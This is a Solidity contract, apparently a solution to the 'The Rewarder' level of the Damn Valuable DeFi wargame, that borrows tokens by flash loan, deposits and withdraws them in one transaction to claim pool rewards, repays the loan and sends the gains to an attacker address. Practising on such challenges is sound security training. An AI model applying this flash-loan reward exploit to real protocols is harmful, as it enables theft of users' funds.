// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract RewarderAttacker {

    FlashLoanerPool pool;
    DamnValuableToken DVTtoken;
    TheRewarderPool rewarderPool;
    address attacker;

    constructor(address poolAddress, address tokenAdress, address rewarderPoolAddress, address attackerAddress) {
        pool = FlashLoanerPool(poolAddress);
        DVTtoken = DamnValuableToken(tokenAdress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        attacker = attackerAddress;
    }

    function callFlashLoan(uint256 _amount) external{
        pool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external{
        console.log(" printing", _amount);
        DVTtoken.approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        rewarderPool.withdraw(_amount);
        DVTtoken.transfer(address(pool), _amount);

    }

    function withdraw(address token) external{
        uint gains = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(attacker, gains);
    }

}